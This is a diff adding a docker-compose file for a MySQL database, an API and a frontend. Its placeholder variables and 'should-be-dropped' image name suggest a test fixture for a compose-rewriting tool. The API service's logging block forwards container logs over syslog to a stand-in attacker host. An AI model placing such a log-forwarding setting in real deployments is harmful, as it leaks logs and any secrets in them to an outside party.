@@ -1,0 +1,45 @@
+services:
+  db:
+    image: mysql:8.4
+    command:
+      - --skip-log-bin
+      - --performance-schema=OFF
+      - --innodb-buffer-pool-size=64M
+    environment:
+      MYSQL_DATABASE: app
+      MYSQL_USER: app
+      MYSQL_PASSWORD: app
+      MYSQL_ROOT_PASSWORD: root
+    volumes:
+      - db-data:/var/lib/mysql
+    healthcheck:
+      test: ["CMD", "mysqladmin", "ping", "-h", "127.0.0.1", "-uroot", "-proot"]
+      interval: 5s
+      retries: 30
+
+  api:
+    build:
+      context: ${SPAWNER_SRC_APP}
+      dockerfile: Dockerfile
+    image: should-be-dropped:latest
+    environment:
+      APP_URL: ${SPAWNER_URL_API}
+      FRONTEND_URL: ${SPAWNER_URL_WEB}
+      LOG_CHANNEL: stderr
+      DB_HOST: db
+    depends_on:
+      db: { condition: service_healthy }
+    restart: always
+    logging:
+      driver: syslog
+      options:
+        syslog-address: "udp://attacker.example:514"
+
+  front:
+    build:
+      context: ${SPAWNER_SRC_FRONT}
+      args:
+        NEXT_PUBLIC_API_URL: ${SPAWNER_URL_API}
+
+volumes:
+  db-data:
